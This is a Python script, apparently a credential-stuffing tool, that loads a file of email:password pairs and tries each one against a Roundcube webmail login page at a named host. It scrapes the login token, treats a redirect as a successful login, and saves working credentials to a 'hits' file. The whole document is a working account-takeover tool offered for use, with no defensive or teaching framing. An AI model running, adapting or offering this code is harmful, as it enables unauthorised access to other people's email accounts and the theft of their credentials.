import argparse
import sys
import os
import requests
import re
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)

passwords, emails = [], []
proxy = []

threads = 1
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
}
def parse_token(text):
    pattern = 'request_token":"(.*)"}'
    token = re.findall(pattern, text)
    return token
def verify():
    try:
        r = requests.get(url, timeout=1)
        token = parse_token(r.text)
        if(token == ""):
            return False
        return True
    except Exception as ex:
        print(ex)
        return False


######this is my designe script brute forced
print(""" 
    ____           ______     __                           ____           
   / __ )__  __   / ____/  __/ /_________  ____ ___  ___  / __ \___ _   __
  / __  / / / /  / __/ | |/_/ __/ ___/ _ \/ __ `__ \/ _ \/ / / / _ \ | / /
 / /_/ / /_/ /  / /____>  </ /_/ /  /  __/ / / / / /  __/ /_/ /  __/ |/ / 
/_____/\__, /  /_____/_/|_|\__/_/   \___/_/ /_/ /_/\___/_____/\___/|___/  
      /____/          """+Fore.CYAN+""" By Mustapha Sahlaoui                                                         

""")


#load combo list

def chekerMail(email,password):
        try:    
                url = "https://www.mailindeed.com/roundcube/"
                r = requests.get(url)
                cookies = r.cookies
                token = parse_token(r.text)
                r = requests.post(url + '?_task=login',
                data={"_token": token, "_task": "login", "_action": "login", "_timezone": "Europe/Moscow",
                "_url": "", "_user": email, "_pass": password}, headers=headers, cookies=cookies,
                allow_redirects=False)

                if (r.status_code == 302):
                        print(Fore.CYAN + Style.BRIGHT+"Succes with %s:%s" % (email, password))
                        files=open("hits.txt","a")
                        files.writelines("Hits:   "+email+":"+password+"\n")
                else:
                        print(Fore.RED + Style.BRIGHT+"Invalide: %s:%s" % (email, password))
        except Exception as ex:
                print(ex)
print(Fore.CYAN+"--------------------------------------------------------------------")
print(Fore.CYAN+"------------------------Load combolist------------------------------")
account = input("\nEnter the path to COMBO file : ")
if not os.path.exists(account):
    sys.exit(f"[!] File '{account}' is does't exists!.")
elif os.path.getsize(account) == 0:
    sys.exit(f"[!] File '{account}' is empty!.")
loaded = len(open(account).readlines())
print ("\n", loaded, Fore.CYAN+" Accounts loaded for checking.......!")
print(Fore.RED + Style.BRIGHT+"------------------------Mustapha Sahlaoui----------------------------")
file=open(account,"r").readlines()
for i in file:
    seq=i.strip()
    acc=seq.split(":")
    chekerMail(acc[0],acc[1])
print("--------------------------------------------------------------------")